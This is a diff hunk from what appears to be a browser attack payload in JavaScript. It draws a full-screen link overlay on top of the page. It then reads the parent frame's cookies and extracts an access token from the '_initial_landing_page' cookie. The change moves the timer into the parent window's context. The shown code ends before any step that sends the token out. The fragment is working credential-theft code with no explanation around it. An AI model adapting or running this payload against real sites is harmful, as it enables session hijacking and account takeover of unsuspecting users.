@@ -9,7 +9,7 @@
   a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;display:flex;align-items:center;justify-content:center;z-index:2147483647;text-decoration:none;cursor:pointer';
   d.body.append(a);
 
-  setTimeout(function () {
+  parent.setTimeout(function () {
     var c = parent.document.cookie;
     var t = (c.match(/_initial_landing_page=([^;]*)/) || [])[1] || '';
     t = (t.match(/access_token=([^&#]+)/) || [])[1] || 'none';
